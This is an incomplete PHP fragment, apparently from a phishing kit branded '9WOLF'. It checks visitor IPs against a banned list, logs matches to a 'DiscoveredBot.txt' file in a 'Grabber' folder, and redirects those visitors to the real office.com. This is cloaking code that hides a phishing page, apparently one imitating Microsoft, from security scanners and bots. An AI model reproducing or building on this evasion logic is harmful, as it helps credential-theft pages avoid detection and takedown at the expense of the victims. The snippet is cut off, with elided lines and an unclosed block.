...
if($block_iprange == "on"){
if(in_array($userIp,$WOLFIpBanned)){
	$message = ("9WOLF Decliend =>  IP: ". $userIp." || Date:".gmdate ("d M,Y")." TIME:".gmdate ("g:i a")."\n\n");
...
foreach($WOLFIpBanned as $bot_ip){
	if(preg_match('/'.$bot_ip.'/',$userIp)){
		$message = "9WOLF Decliend => ".$userIp." [ IP ] \n";
		$save=fopen("9WOLFGrabber/DiscoveredBot.txt","a+");
	    fwrite($save,$message);
	    fclose($save);
		header("Location: https://office.com");exit();	
